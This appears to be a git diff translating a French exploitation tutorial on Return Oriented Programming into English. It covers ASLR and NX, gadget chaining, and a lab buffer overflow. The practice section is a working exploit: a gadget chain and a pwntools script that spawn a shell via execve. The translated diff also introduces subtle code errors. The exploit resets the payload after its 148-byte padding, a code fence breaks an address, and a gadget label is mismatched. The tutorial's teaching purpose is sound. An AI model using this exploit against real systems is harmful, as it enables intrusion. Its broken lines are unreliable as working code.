@@ -5,54 +5,48 @@ author: "Pixis"
 layout: post
 permalink: /return-oriented-programming/
 disqus_identifier: 0000-0000-0000-0016
-description: "Cet article a pour but d'expliquer clairement ce qu'est le ROP ou Return Oriented Programming."
+description: "This article aims to explain clearly what ROP or Return Oriented Programming is."
 cover: assets/uploads/2016/10/fourth_gadget.png
 tags:
   - "User Land"
   - Linux
+translation:
+  - fr
 ---
 
-Cet article a pour but d'expliquer clairement ce qu'est le ROP ou Return Oriented Programming. Qu'est-ce que cette technique ? Pourquoi est-elle utile ? Quelles sont les limites ? Comment la mettre en place ? Nous allons répondre ensemble à ces différentes questions.
+This article aims to explain clearly what ROP or Return Oriented Programming is. What is this technique? Why is it useful? What are the limits? How to implement it? We will answer these questions together.
 
 <!--more-->
 
+## Reminders
 
-## Rappels
+We have seen in previous articles two techniques of exploitation following a buffer overflow. The first one was a [simple introduction and exploitation of buffer overflow (stack-based)](https://beta.hackndo.com/buffer-overflow/) when we had no protection. The stack was executable and the Address Space Layout Randomization (ASLR) was not activated. We will come back to these protections in the following.
+We then detailed a technique that could be used when the stack was no longer executable. For that, you can read the article about the [return to libc](https://beta.hackndo.com/retour-a-la-libc/), but this one doesn't work anymore when the ASLR is activated.
+This article aims at exposing a new exploitation technique, the ROP (Return Oriented Programming) which allows, in spite of these various protections, to divert the execution flow of a program in order to take control of it.
 
-Nous avons vu dans des précédants articles deux techniques d'exploitation suite à un buffer overflow. La première était une [introduction et exploitation simple des buffer overflow (stack-based)](/buffer-overflow/) lorsque nous n'avions aucune protection. La pile était exécutable et la distribution aléatoire de l'adressage (ASLR - _Address Space Layout Randomization_) n'était pas activée. Nous reviendrons sur ces protections dans la suite.
-
-Nous avons alors détaillé une technique pouvant être utilisée lorsque la pile n'était plus exécutable. Pour cela, vous pouvez lire l'article sur [le retour à la libc](/retour-a-la-libc/), mais celui-ci ne fonctionne plus lorsque l'ASLR est activé.
-
-Cet article a alors pour but d'exposer une nouvelle technique d'exploitation, le ROP (_Return Oriented Programming_) qui permet malgré ces différentes protections de détourner de flux d'exécution d'un programme afin d'en prendre le contrôle.
-
-## Théorie
-
+## Theory
 ### ASLR
 
-Lorsque vous exécutez un programme, les entêtes du binaires sont supposés donner l'emplacement des différents segments/sections. Ainsi, à chaque fois qu'on lance le binaire, les adresses ne varient pas. La pile commence toujours au même endroit, même chose pour le tas, ainsi que les segments du binaire (Mais si ! Vous savez, on a tout expliqué dans l'article sur [la gestion de la mémoire](/memory-allocation/)).
-
-Et bien l'ASLR est une protection dans le noyau qui va rendre certains espaces d'adressages aléatoires. Généralement, la pile, le tas et les bibliothèques sont impactées. Il n'est alors plus possible de retrouver à coup sûr l'adresse d'un shellcode placé sur la pile, ou l'adresse de la fonction `system` dans la libc. C'est bien ennuyant.
-
-Mais ne vous inquiétez pas, ROP est là pour nous sauver.
+When you run a program, the headers of the binary are supposed to give the location of the different segments/sections. Thus, each time you run the binary, the addresses do not vary. The stack always starts at the same place, the same for the heap, as well as the segments of the binary (But yes! You know, we explained everything in the article about [memory management](https://beta.hackndo.com/memory-allocation/)).
+Well, ASLR is a protection in the kernel that will make some address spaces random. Generally, the stack, the heap and the libraries are impacted. It is then no longer possible to find the address of a shellcode placed on the stack, or the address of the `system` function in the libc. This is very annoying.
+But don't worry, ROP is here to save us.
 
 ### ROP - Return Oriented Programming
 
-Si vous aviez suivi l'article sur [le retour à la libc](/retour-a-la-libc/), alors sachez que c'était une sorte d'introduction au ROP.
+If you had been following the article on the [return to libc](https://beta.hackndo.com/retour-a-la-libc/), then you should know that it was a kind of introduction to ROP.
+We are still in the same context. A binary is vulnerable to buffer overflow. However, this binary has the two protections we have mentioned
 
-Nous sommes toujours dans le même contexte. Un binaire est vulnérable au buffer overflow. Cependant ce binaire possède les deux protections que nous avons évoquées
+- **NX** : This is the common name for the protection that makes the stack **N**on-e**X**ecutable. No more shellcode on the stack, either in the buffer or in environment variables.
+- **ASLR** : In addition to not being executable anymore, the stack moves from one execution to another, just like the heap or the libraries. So this time, we can't find the address of `system` for sure as we did in the article about the [return to libc](https://beta.hackndo.com/retour-a-la-libc/).
 
-* **NX** : C'est le nom répandu de la protection qui rend la pile **N**on e**X**écutable. Finis les shellcode sur la pile, que ce soit dans le buffer ou dans des variables d'environnement.
-* **ASLR** : En plus de ne plus être exécutable, la pile bouge d'une exécution à l'autre, tout comme le tas ou les librairies. Donc cette fois, nous ne pouvons plus trouver à coup sûr l'adresse de `system` comme nous l'avions fait dans l'article sur [le retour à la libc](/retour-a-la-libc/).
+To overcome these two protections, we need to find an exploitation technique that does not execute anything on the stack, and that uses information that does not move from one execution to another. For this, we will use code that has already been created. And what could be easier than using the code of the binary we want to exploit?
 
-Pour pallier à ces deux protections, il faut alors trouver une technique d'exploitation qui n'exécute rien sur la pile, et qui utilise des informations qui ne bougent pas d'une exécution à l'autre. Pour cela, nous allons utiliser du code qui a déjà été créé. Et quoi de plus simple qu'utiliser le code du binaire que nous voulons exploiter ?
+### The gadgets
 
-#### Les gadgets
+It is true that a binary rarely has the code to launch a shell. That would be too nice. However, we can find in one place a piece of code that allows to do an action, then in another place another piece of code that allows to do something else, and so on. In this way, by chaining these little bits of instructions, we can finally succeed in doing actions that were not foreseen by the binary.
 
-Il est vrai qu'un binaire possède rarement le code permettant de lancer un shell. Ce serait trop beau. Cependant nous pouvons trouver à un endroit un bout de code qui permet de faire une action, puis à un autre endroit un autre bout de code qui permet de faire autre chose, et ainsi de suite. De cette façon, en enchaînant ces petits bouts d'instructions, on peut finalement réussir à faire des actions qui n'étaient pas prévues par le binaire.
-
-Un exemple pas vraiment réaliste mais qui permet d'illustrer mes propos. Considérons la suite d'instruction présente, qui se trouve dans le binaire :
-
-```bash
+An example that is not really realistic but that helps to illustrate my point. Let's consider the present instruction sequence, which is in the binary :
+```
 [1] PUSH    EBP
 [2] MOV     EBP, ESP
 [3] SUB     ESP, 0x40
@@ -63,20 +57,17 @@ Un exemple pas vraiment réaliste mais qui permet d'illustrer mes propos. Consid
 [8] CALL    PRINTF
 ```
 
-Le code précédant est un prologue de fonction, et place la chaine de caractère `ABCD\x00` sur la pile avant d'appeler la fonction `printf`. Remarquez que j'ai numéroté les lignes. Si maintenant nous prenons les instructions dans un nouvel ordre, par exemple [4] puis [5] suivi de [1] et enfin [8] alors nous aurions
-
-```bash
+The preceding code is a function prologue, and places the string `ABCD\x00` on the stack before calling the `printf` function. Notice that I have numbered the lines. If we now take the instructions in a new order, for example [4] then [5] followed by [1] and finally [8] then we would have : 
+```
 [4] XOR     EAX, EAX
 [5] PUSH    EAX
 [1] PUSH    EBP
 [8] CALL    PRINTF
 ```
 
-Dans ce cas, nous aurions `0x00` sur la pile suivi de la valeur de `EBP` et enfin un appel à `printf`. Le résultat ne serait plus du tout le même. Pour peu que d'une certaine manière, nous contrôlions `EBP`, nous pourrions alors afficher ce que nous voulons, et pourquoi pas enchaîner sur une vulnérabilité de type chaîne de format.
-
-Mais ce n'est pas tout, nous pouvons aller encore plus loin. Voilà la représentation en hexadécimal des instructions précédentes
-
-```bash
+In this case, we would have `0x00` on the stack followed by the value of `EBP` and finally a call to `printf`. The result would not be the same at all. As long as we control EBP in some way, we could then display what we want, and why not go on to a format string vulnerability.
+But that's not all, we can go even further. Here is the hexadecimal representation of the previous instructions :
+```
 55                  PUSH    EBP
 89 e5               MOV     EBP, ESP
 81 ec 40 00 00 00   SUB     ESP, 0x40
@@ -87,26 +78,25 @@ b8 44 43 42 41      MOV     EAX, 0x41424344
 e8 b1 69 00 00      CALL    PRINTF
 ```
 
-Nous avons pensé à mélanger les instructions, mais il est également possible d'exécuter des morceaux d'instructions.
+We thought of mixing instructions, but it is also possible to execute pieces of instructions.
 
-Je m'explique. Une analogie existe avec la langue française.
+Let me explain. An analogy exists with the English language.
 
-Dans le mot "République", même si ce n'était pas mon intention, il y a aussi les mots "Pub", "Pu", "Publique" etc. Ce n'était pas le sens que je cherchais, mais rien n'empêche de ne choisir de lire que ces parties là. 
+In the word "Republic", even if it was not my intention, there are also the words "Pub", "Pu", "Public" etc. It was not the meaning I was looking for, but nothing prevents you from choosing to read only those parts.
 
-Bref, vous avez compris le principe : Nous allons piquer des morceaux d'instructions à droite et à gauche, pas forcément des bouts d'instructions prévues par le programmeur, et en les mettant bout en bout, nous allons exécuter du code arbitraire.
+Anyway, you understood the principle: We'll pick up pieces of instructions from right and left, not necessarily pieces of instructions planned by the programmer, and by putting them end to end, we'll execute arbitrary code.
 
-Ces bouts d'instructions sont appelés des **gadgets**.
+These bits of instructions are called **gadgets**.
 
-#### Utilisation des gadgets
+### Use of the gadgets
 
-Tout ça, c'est chouette, mais alors comment exécuter ces bouts d'instruction, ces gadgets ?
+All this is nice, but then how to execute these bits of instructions, these gadgets?
 
-Dans un buffer overflow, lorsque nous écrasons suffisamment de données, nous finissons par écraser la sauvegarde de `EBP` (poussée sur la pile durant le prologue d'une fonction) puis la sauvegarde de `EIP` de la fonction appelante. Nous pouvons alors rediriger le programme là où nous le souhaitons, vers un gadget qui nous intéresse.
+In a buffer overflow, when we overwrite enough data, we end up overwriting the EBP backup (pushed on the stack during the prologue of a function) and then the EIP backup of the calling function. We can then redirect the program where we want it, to a gadget of interest.
 
-Cependant, une fois que ce morceau de code (gadget) est exécuté, nous souhaitons reprendre le contrôle du flux d'exécution pour sauter sur le deuxième gadget.
+However, once this piece of code (gadget) is executed, we want to regain control of the execution flow to jump to the second gadget.
 
-Cette contrainte fait que les gadget ont presque toujours la même forme :
-
+This constraint makes that the gadgets have almost always the same shape:
 ```
 <instruction 1>
 <instruction 2>
@@ -115,89 +105,81 @@ Cette contrainte fait que les gadget ont presque toujours la même forme :
 RET
 ```
 
-Ainsi, lorsque les instructions que nous voulons effectuer ont été exécutées, l'instruction `RET` permet de sauter à l'instruction dont l'adresse est sur le dessus de la pile, pile que nous contrôlons grâce au buffer overflow.
+Thus, when the instructions we want to perform have been executed, the `RET` instruction allows us to jump to the instruction whose address is on the top of the stack, a stack that we control thanks to the buffer overflow.
 
-Voici un exemple concret. Imaginons que dans l'ensemble des instructions de mon binaire, je trouve à différents endroits les instructions suivantes
-
-```bash
-# 0x08041234 Instructions 1
+Here is a concrete example. Let's imagine that in the set of instructions of my binary, I find in different places the following instructions : 
+```
+# 0x08041234 Instruction 1
 INC   EAX
 RET
 
-# 0x08046666 Instructions 2
+# 0x08046666 Instruction 2
 XOR   EAX, EAX
 RET
 
-# 0x08041337 Instructions 3
+# 0x08041337 Instruction 3
 POP   EBX
 RET
 
-# 0x08044242 Instructions 4
+# 0x08044242 Instructios 4
 INT   0x80
 ```
 
-Vous voyez que nous avons les adresses de ces 4 gadgets (suites d'instructions) `0x08041234`, `0x08046666`, `0x08041337` et `0x08044242`.
+You can see that we have the addresses of these 4 gadgets (instruction sequences) `0x08041234`, `0x08046666`, `0x08041337` and `0x08044242`.
 
-Pour que l'exemple reste simple, nous allons effectuer un appel système `sys_exit` avec comme argument la valeur `3` (Pour tous les appels systèmes vous pouvez jeter un oeil à mon github pour les architectures [32 bits](https://github.com/Hackndo/misc/blob/master/syscalls32.md){:target="blank"} et les [64 bits](https://github.com/Hackndo/misc/blob/master/syscalls64.md){:target="blank"}).
+To keep the example simple, we will make a `sys_exit` system call with the value `3` as argument (For all system calls you can have a look at my github for [32 bits](https://github.com/Hackndo/misc/blob/master/syscalls32.md) and [64 bits](https://github.com/Hackndo/misc/blob/master/syscalls64.md) architectures).
 
-D'après le tableau 32 bits, pour faire un appel système à `sys_exit`, `EAX` doit prendre la valeur **1** et `EBX` la valeur du code de retour, ici **3** comme nous l'avons décidé.
+According to the 32-bit table, to make a system call to `sys_exit`, `EAX` must take the value 1 and EBX the value of the return code, here `3` as we have decided.
 
-Afin d'obtenir ces valeurs, en ayant les 4 différentes suites d'instructions précédentes, nous pouvons faire ceci :
-
-```bash
-XOR    EAX, EAX		# Pour que EAX = 0
-INC    EAX		# Afin que EAX = 1
-POP    EBX		# En faisant en sorte que la valeur 0x00000003 soit sur la pile
-INT    0x80		# Permettant de faire l'appel système
+In order to obtain these values, having the 4 different sequences of instructions above, we can do this :
+```
+XOR    EAX, EAX		# So that EAX = 0
+INC    EAX		    # Make EAX = 1
+POP    EBX		    # Making the value 0x00000003 be on the stack
+INT    0x80		    # To make the system call
 ```
 
-Ces différentes instructions mises bout à bout avec les bonnes valeurs sur la pile devraient appeler la fonction `exit(3)`.
+These different instructions put together with the right values on the stack should call the `exit(3)` function.
 
-Revenons à notre buffer overflow. Nous avons réécrit la valeur de la sauvegarde de `EIP` de la fonction appelante. Ainsi, lorsque notre fonction aura terminé de s'exécuter, nous serons redirigé vers la valeur que nous avons mis sur la sauvegarde de `EIP`.
+Let's go back to our buffer overflow. We have rewritten the value of the `EIP` backup of the calling function. So, when our function finishes executing, we will be redirected to the value we put on the `EIP` save.
 
-Nous allons donc rediriger le flux d'exécution vers la première instruction que nous souhaitons exécuter, qui est le `XOR EAX, EAX`. La pile ressemblera alors à ceci
+So we will redirect the execution flow to the first instruction we want to execute, which is the `XOR EAX, EAX`. The stack will then look like this
 
-[![first_gadget](/assets/uploads/2016/10/first_gadget.png)](/assets/uploads/2016/10/first_gadget.png)
+IMAGE
 
-Le flux d'exécution va être redirigé vers les instructions
-
-```bash
-# 0x08041234 Instructions 1
+The execution flow will be redirected to the instructions : 
+```
+# 0x08041234 Instruction 1
 XOR    EAX, EAX
 RET
 ```
 
-Une fois le `XOR` effectué, c'est l'instruction `RET` qui va être exécutée. Pour rappel, un `RET` n'est rien d'autre qu'un `POP EIP`. L'adresse sur le dessus de la pile va donc être mis dans le registre `EIP`. Comme l'adresse sur le dessus de la pile est juste après le sEIP que nous avons écrasé (et qui a déjà été `POP` par le `RET` de la fonction), il suffit de mettre l'adresse du deuxième gadget sur le sommet de la pile, comme suit :
+Once the `XOR` is done, the `RET` instruction will be executed. As a reminder, a `RET` is nothing else than a `POP EIP`. The address on the top of the stack will be put in the `EIP` register. As the address on the top of the stack is just after the sEIP that we have overwritten (and that has already been `POP`'d by the `RET` of the function), we just have to put the address of the second gadget on the top of the stack, as follows :
 
-[![second_gadget](/assets/uploads/2016/10/second_gadget.png)](/assets/uploads/2016/10/second_gadget.png)
+IMAGE
 
+Followed by the gadget that allows to make the `POP EBX`. However this gadget needs a specific value on the stack, since the gadget will "pop" a value to put it in `EBX`. We will then have the following stack :
 
-Suivi ensuite du gadget qui permet de faire le `POP EBX`. Cependant ce gadget a besoin d'une valeur spécifique sur la pile, puisque le gadget va "popper" une valeur pour la mettre dans `EBX`. Nous aurons alors la pile suivante
+IMAGE
 
-[![third_gadget](/assets/uploads/2016/10/third_gadget.png)](/assets/uploads/2016/10/third_gadget.png)
+The `POP EBX` will then remove the value `0x00000003` from the stack. All our registers are ready, we just have to redirect the flow to the `int 0x80` instruction which makes the system call : 
 
+IMAGE
 
-Le `POP EBX` va alors retirer la valeur `0x00000003` de la pile. Tous nos registres sont prêts, il ne reste plus qu'à rediriger le flux vers l'instruction `int 0x80` qui effectue l'appel système
+By organizing the stack in this way, we will have our gadgets chained together, filling the registers as we knew them before making the system call that interests us.
 
-[![fourth_gadget](/assets/uploads/2016/10/fourth_gadget.png)](/assets/uploads/2016/10/fourth_gadget.png)
+Now let's move on to a concrete case.
 
+### Practice
+*In this example, I will use the addresses I have on my machine, they will probably not correspond to yours. So adapt your example according to the results of the different commands on your machine!*
 
-En organisant la pile de cette manière, nous aurons nos gadgets qui vont s'enchaîner, remplir les registres tel que nous le shouaitons avant d'effectuer l'appel système qui nous intéresse.
-
-Passons maintenant à un cas concret.
-
-## Pratique
-
-_Dans cet exemple, je prendrai les adresses que j'ai sur ma machine, elles ne correspondront sans doute pas aux votres. Adaptez donc votre exemple en fonction des résultats des différentes commandes sur votre machine !_
-
-Voici le programme vulnérable
-
-```c
+Here is the vulnerable program : 
+```
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-# Pour la compilation, il faut ajouter ces informations pour avoir les bonnes protections
+# For the compilation, you must add this information to have the right protections
 # clang -o rop rop.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
 
 int main(int argc, char ** argv) {
@@ -217,19 +199,17 @@ int main(int argc, char ** argv) {
 }
 ```
 
-J'utilise ici le compilateur `clang` car `gcc` [produit un prologue et un épilogue](http://reverseengineering.stackexchange.com/questions/13811/what-is-this-protection-that-seems-to-prevent-rop-when-aslr-in-on){:target="blank"} qui rendent l'exploitation plus compliquée. Comme le but de cet article est de faire une démonstration simple et classique du ROP, nous utilisons clang qui produit un binaire "classique".
+I use here the `clang` compiler because `gcc` [produces a prologue and an epilogue](http://reverseengineering.stackexchange.com/questions/13811/what-is-this-protection-that-seems-to-prevent-rop-when-aslr-in-on) which make the exploitation more complicated. As the purpose of this article is to make a simple and classical demonstration of ROP, we use clang which produces a "classical" binary.
 
-Vous remarquez l'évident buffer overflow, si nous passons à ce binaire un gros buffer, il va normalement nous renvoyer une erreur de segmentation.
-
-```bash
+You notice the obvious buffer overflow, if we pass this binary a large buffer, it will normally return a segmentation error.
+```
 $ perl -e 'print "A"x500' | ./rop
 You password is incorrect
 Segmentation fault (core dumped)
 ```
 
-Comme le montre la commande suivante, la stack `GNU_STACK` n'a pas le flag `X` (seulement `RW`) donc elle n'est donc pas exécutable.
-
-```bash
+As the following command shows, the `GNU_STACK` stack does not have the `X` flag (only `RW`) so it is not executable.
+```
 $ readelf -l rop
 
 Elf file type is EXEC (Executable file)
@@ -244,38 +224,33 @@ Program Headers:
   TLS            0x0a0f1c 0x080e9f1c 0x080e9f1c 0x00010 0x00028 R   0x4
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
   GNU_RELRO      0x0a0f1c 0x080e9f1c 0x080e9f1c 0x000e4 0x000e4 R   0x1
-
 ```
 
-Par ailleurs, l'ASLR est activé comme le montre le flag situé ici
-
-```bash
+Moreover, the ASLR is activated as shown by the flag located here : 
+```
 $ cat /proc/sys/kernel/randomize_va_space
 2
 ```
 
-Si vous n'avez pas le même résultat, avec un autre nombre que le `2`, alors effectuez cette commande pour activer l'ASLR.
+If you do not get the same result, with a number other than 2, then perform this command to activate ASLR.
 
-```bash
+```
 echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
 
-Vous pourrez toujours revenir à votre configuration d'origine en remettant le numéro que vous aviez initialement.
+You can always go back to your original configuration by putting back the number you had initially.
 
-Nous allons essayer de lancer un shell avec ce programme, malgré les protections mises en place. Pour cela, nous allons avoir besoin de gadgets. Un outil extrêmement connu pour cette recherche s'appelle [ROPgadget](http://shell-storm.org/project/ROPgadget/){:target="blank"}, je vous laisse l'installer. Il est très puissant et possède tout un tas d'options.
+We will try to launch a shell with this program, despite the protections in place. To do this, we will need gadgets. An extremely well known tool for this purpose is called [ROPgadget](http://shell-storm.org/project/ROPgadget/), I'll let you install it. It is very powerful and has a lot of options.
 
-Une commande de base est 
-
-```bash
+A basic command is :
+```
 $ ROPgadget --binary rop
-
 ```
 
-Cette commande va nous sortir tous les gadgets qui finissent par un RET avec 10 instructions ou moins avant.
+This command will output all gadgets that end in a `RET` with 10 or less instructions before.
 
-En voici un extrait
-
-```bash
+Here is an excerpt : 
+```
 [...]
 0x0804c47e : xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
 0x08050815 : xor eax, eax ; pop ebx ; pop esi ; pop edi ; ret
@@ -285,125 +260,116 @@ En voici un extrait
 Unique gadgets found: 11840
 ```
 
-Vous voyez qu'on a de quoi faire. 11840 résultats.
+You can see that we have a lot to do. 11840 results.
 
-Si par exemple nous voulons trouver un `XOR EAX, EAX`
-
-```bash
+If for example we want to find an `XOR EAX, EAX`
+```
 $ ROPgadget --binary rop | grep "xor eax"
 [...]
 0x08049323 : xor eax, eax ; ret
 ```
 
-Parfait. Nous avons notre premier gadget qui nous sera utile.
+Great. We have our first gadget that will be useful.
 
-Je vous rappelle que nous voulons exécuter un shell. Il nous faut alors lancer `sys_execve("/bin/sh", NULL, NULL)`.
+I remind you that we want to run a shell. We need to run `sys_execve("/bin/sh", NULL, NULL)`.
 
-D'après la table des appels systèmes [32 bits](https://github.com/Hackndo/misc/blob/master/syscalls32.md){:target="blank"}, la valeur de `EAX` pour un `execve` est de 11. Maintenant qu'on a un gadget qui initialise `EAX` à zéro, il faut par exemple l'incrémenter.
-
-```bash
+According to the [32-bit](https://github.com/Hackndo/misc/blob/master/syscalls32.md) system call table, the value of `EAX` for an `execve` is 11. Now that we have a gadget that initializes `EAX` to zero, we have to increment it.
+```
 $ ROPgadget --binary rop | grep "inc eax"
 [...]
 0x0804812c : inc eax ; ret
 [...]
 ```
 
-Parfait, so far so good.
+Perfect, so far so good.
 
-Il nous faut ensuite faire en sorte que `EBX` pointe sur la chaine de caractère "/bin/sh", et que `ECX` et `EDX` soient des pointeurs nuls, car nous n'en avons pas besoin.
+Then we have to make `EBX` point to the string "/bin/sh", and `ECX` and `EDX` are null pointers, because we don't need them.
 
-Pour pointer sur la chaine de caractère "/bin/sh", il faut la placer en mémoire. Pour cela, il faut pouvoir écrire où nous le souhaitons. C'est une suite de gadget assez recherchée en général, et elle a un nom bien précis **Write-what-where**.
+To point to the string "/bin/sh", we need to put it in memory. To do this, we must be able to write where we want. This is a rather fancy gadget suite in general, and it has a very specific name **Write-what-where**.
 
-En voici un exemple avec les gadgets proposés par le binaire
-
-```bash
+Here is an example with the gadgets proposed by the binary : 
+```
 0x0806ed1a : pop edx ; ret
 0x080b8056 : pop eax ; ret
 0x080546db : mov dword ptr [edx], eax ; ret
 ```
 
-Avec ces trois gadgets, nous contrôlons les contenus des registres `EDX` et `EAX`, puis nous pouvons déplacer le contenu de `EAX` à l'adresse pointée par `EDX`. Nous écrivons donc ce que nous voulons, là où nous le shouaitons. Parfait !
+With these three gadgets, we control the contents of the `EDX` and `EAX` registers, and then we can move the contents of `EAX` to the address pointed to by `EDX`. So we write what we want, where we want it. Perfect!
 
-Nous sommes donc en mesure d'écrire "/bin/sh" quelque part en mémoire, par exemple dans .data qui ne bouge pas malgré l'ASLR.
-
-```bash
+So we are able to write "/bin/sh" somewhere in memory, for example in .data which does not move despite ASLR.
+```
 $ readelf -S rop | grep " .data "
   [23] .data             PROGBITS        080ea000 0a1000 000f20 00  WA  0   0 32
 ```
 
-`.data` possède le flag `W` comme **W**ritable et se situe à l'adresse `0x080ea000`.
+`.data` has the flag `W` for **W**ritable and is located at address `0x080ea000`.
 
-Enfin, nous devons trouver des gadgets pour contrôler nos registres `EBX` et `ECX` (car nous avons déjà trouvé un gadget pour `EDX` lors du _write-what-where_). Vous avez compris la technique, en voici deux :
-
-```bash
+Finally, we need to find gadgets to control our `EBX` and `ECX` registers (because we already found a gadget for `EDX` during the write-what-where). You have understood the technique, here are two of them:
+```
 0x080de7ad : pop ecx ; ret
 0x080481c9 : pop ebx ; ret
 ```
 
-Bien sûr, pour pouvoir exécuter tout ça, il faut faire un appel à une instruction `int 0x80`
-
-```bash
-0x0806c985 : int 0x80
+Of course, to be able to execute all this, you have to make a call to an `int 0x80` instruction : 
+```0
+x0806c985 : int 0x80
 ```
 
-Et bien c'est parfait, nous avons maintenant tous les gadgets en main pour pouvoir effectuer notre ROP. Pour la construction de la chaine, nous allons procéder comme suit :
+Well that's fine, we now have all the gadgets in hand to be able to perform our ROP. To build the chain, we will proceed as follows :
+- Place "/bin/sh" at the beginning of `.data`
+- Put null bytes just after, so that the string "/bin/sh" ends with a null character.
+- Put the address of "/bin/sh" in `EBX`
+- Put `0x00` in `ECX` and `EDX`
+- Put 11 (0xb) in `EAX` (syscall number)
+- Make a call to `int 0x80`
 
-* Placer "/bin/sh" au début de `.data`
-* Placer des octets nuls juste après, pour que la chaine "/bin/sh" se termine par un caractère nul.
-* Mettre l'adresse de "/bin/sh" dans `EBX`
-* Mettre des `0x00` dans ECX et EDX
-* Mettre 11 (0xb) dans `EAX` (numéro du syscall)
-* Faire un appel à `int 0x80`
+Here is a python code that prepares the overflow by chaining the gadgets.
 
-
-Voici un code python qui prépare le débordement en chainant les gadgets.
-
-```python
+```
 p =  pack('<I', 0x0806ed1a) 		# pop edx ; ret
-p += pack('<I', 0x080ea000) 		# Dans edx, nous mettons l'adresse du début de .data
+p += pack('<I', 0x080ea000) 		# In edx, we put the address of the beginning of .data
 
 p += pack('<I', 0x080b8056) 		# pop eax ; ret
-p += '/bin'				# Dans eax, nous mettons la chaine de caractères "/bin"
+p += '/bin'				            # In eax, we put the string "/bin"
 
-p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | Ce qui permet d'écrire "/bin" dans .data
+p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | This allows to write "/bin" in .data
 
 p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
-p += pack('<I', 0x080ea004) 		# Dans edx, nous mettons l'adresse de .data + 4 pour prévoir "//sh"
+p += pack('<I', 0x080ea004) 		# In edx, we put the address of .data + 4 to provide "//sh"
 
 p += pack('<I', 0x080b8056) 		# pop eax ; ret
-p += '//sh'				# Nous mettons "//sh" dans eax
+p += '//sh'				            # We put "//sh" in eax
 
-p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | Et nous écrivons "//sh" juste après "/bin"
+p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | And we write "//sh" just after "/bin".
 
 p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
-p += pack('<I', 0x080ea008) 		# Dans edx, nous mettons l'adresse de .data + 8, donc après la chaine de caractères "/bin//sh"
+p += pack('<I', 0x080ea008) 		# In edx, we put the address of .data + 8, so after the string "/bin//sh"
 
 p += pack('<I', 0x08049323) 		# xor eax, eax ; ret
 
-p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | Et on s'assure que cet emplacement contient des 0x00 pour terminer la chaine de caractères
+p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | And we make sure that this location contains 0x00 to end the string
 
 p += pack('<I', 0x080481c9) 		# pop ebx ; ret
-p += pack('<I', 0x080ea000) 		# Dans ebx, nous mettons l'adresse du début de .data, qui contient "/bin//sh" suivi de null bytes
+p += pack('<I', 0x080ea000) 		# In ebx, we put the address of the beginning of .data, which contains "/bin//sh" followed by null bytes
 
 p += pack('<I', 0x080de7ad) 		# pop ecx ; ret
-p += pack('<I', 0x00000000) 		# On met ecx à 0
+p += pack('<I', 0x00000000) 		# We set ecx to 0
 
 p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
-p += pack('<I', 0x00000000) 		# On met edx à 0
+p += pack('<I', 0x00000000) 		# We set edx to 0
 
 p += pack('<I', 0x08049323) 		# xor eax, eax ; ret
 
-for i in range(11):			# Afin d'avoir eax = 11, on boucle 11 fois
-	p += pack('<I', 0x0804812c)	# inc eax ; ret
+for i in range(11):			        # In order to have eax = 11, we loop 11 times
+	p += pack('<I', 0x0804812c)	    # inc eax ; ret
 
 p += pack('<I', 0x0806c985) 		# int 0x80
 ```
 
-Rappelez-vous cependant que cette suite de gadgets, appelée **ropchain**, est initiée lors du retour de la fonction. Donc la première instruction de cette **ropchain** doit écraser la sauvegarde de `EIP` de la fonction appelante.
+Remember, however, that this sequence of gadgets, called **ropchain**, is initiated when the function returns. So the first instruction of this **ropchain** must overwrite the `EIP` save of the calling function.
 
-Nous avons vu en détails dans différents articles comment trouver la taille du buffer à allouer avant d'écraser la sauvegarde de `EIP`, et dans mon cas c'est un buffer de 148 octets. Ainsi, mon exploit ressemble à cela en python, en utilisant `pwntools`
-
-```python
+We've seen in detail in various articles how to find the size of the buffer to allocate before overwriting the `EIP` backup, and in my case it's a 148 byte buffer. So my exploit looks like this in python, using `pwntools` :
+```
 #coding: utf-8
 
 from pwn import *
@@ -413,53 +379,52 @@ r = process("./rop")
 
 p = "A"*148
 
-p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
-p += pack('<I', 0x080ea000) 	# Dans edx, nous mettons l'adresse du début de .data
+p =  pack('<I', 0x0806ed1a) 		# pop edx ; ret
+p += pack('<I', 0x080ea000) 		# In edx, we put the address of the beginning of .data
 
-p += pack('<I', 0x080b8056) 	# pop eax ; ret
-p += '/bin'						# Dans eax, nous mettons la chaine de caractères "/bin"
+p += pack('<I', 0x080b8056) 		# pop eax ; ret
+p += '/bin'				            # In eax, we put the string "/bin"
 
-p += pack('<I', 0x080546db) 	# mov dword ptr [edx], eax ; ret | Ce qui permet d'écrire "/bin" dans .data
+p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | This allows to write "/bin" in .data
 
-p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
-p += pack('<I', 0x080ea004) 	# Dans edx, nous mettons l'adresse de .data + 4 pour prévoir "//sh"
+p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
+p += pack('<I', 0x080ea004) 		# In edx, we put the address of .data + 4 to provide "//sh"
 
-p += pack('<I', 0x080b8056) 	# pop eax ; ret
-p += '//sh'						# Nous mettons "//sh" dans eax
+p += pack('<I', 0x080b8056) 		# pop eax ; ret
+p += '//sh'				            # We put "//sh" in eax
 
-p += pack('<I', 0x080546db) 	# mov dword ptr [edx], eax ; ret | Et nous écrivons "//sh" juste après "/bin"
+p += pack('<I', 0x080546db) 		# mov dword ptr [edx], eax ; ret | And we write "//sh" just after "/bin".
 
-p += pack('<I', 0x0806ed1a) 	# pop edx ; ret
-p += pack('<I', 0x080ea008) 	# Dans edx, nous mettons l'adresse de .data + 8, donc après la chaine de caractères "/bin//sh"
+p += pack('<I', 0x0806ed1a) 		# pop edx ; ret
+p += pack('<I', 0x080ea008) 		# In edx, we put the address of .data + 8, so after the string "/bin//sh"
 
